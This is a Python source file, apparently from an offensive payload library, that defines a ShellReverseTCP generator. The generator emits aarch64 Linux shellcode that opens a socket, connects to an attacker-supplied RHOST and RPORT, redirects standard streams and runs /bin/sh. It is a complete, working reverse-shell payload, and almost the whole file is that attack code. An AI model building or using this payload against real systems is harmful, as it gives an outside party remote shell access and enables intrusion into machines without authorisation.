#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2022 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from hatasm import HatAsm
from hatvenom import HatVenom

from hatloads.words import Words


class ShellReverseTCP(HatAsm, HatVenom, Words):
    def generate(self, assemble=True, options={}):
        if 'RHOST' not in options and 'RPORT' not in options:
            return b''

        if 'SHELL' in options:
            shell = options['SHELL'].encode()
        else:
            shell = self.shell['sh'].encode()

        shell = shell[::-1]
        rhost = self.convert_host(options['RHOST'])
        rport = self.convert_port(options['RPORT'])

        shellcode = f"""
        start:
            mov x8, #198
            lsr x1, x8, #7
            lsl x0, x1, #1
            mov x2, xzr
            svc #0x1337

            mvn x4, x0
            lsl x1, x1, #1
            movk x1, #0x{rport.hex()}, lsl #16
            movk x1, #0x{rhost[2:].hex()}, lsl #32
            movk x1, #0x{rhost[:2].hex()}, lsl #48
            str x1, [sp, #-8]!
            add x1, sp, x2
            mov x2, #16
            mov x8, #203
            svc #0x1337

            lsr x1, x2, #2

        dup:
            mvn x0, x4
            lsr x1, x1, #1
            mov x2, xzr
            svc #0x1337

            mov x10, xzr
            cmp x10, x1
            bne dup
            mov x3, #0x622f
            movk x3, #0x6e69, lsl #16
            movk x3, #0x732f, lsl #32
            movk x3, #0x68, lsl #48
            str x3, [sp, #-8]!
            add x0, sp, x1
            mov x8, #221
            svc #0x1337
        """

        if assemble:
            return self.assemble('aarch64', shellcode)
        return shellcode
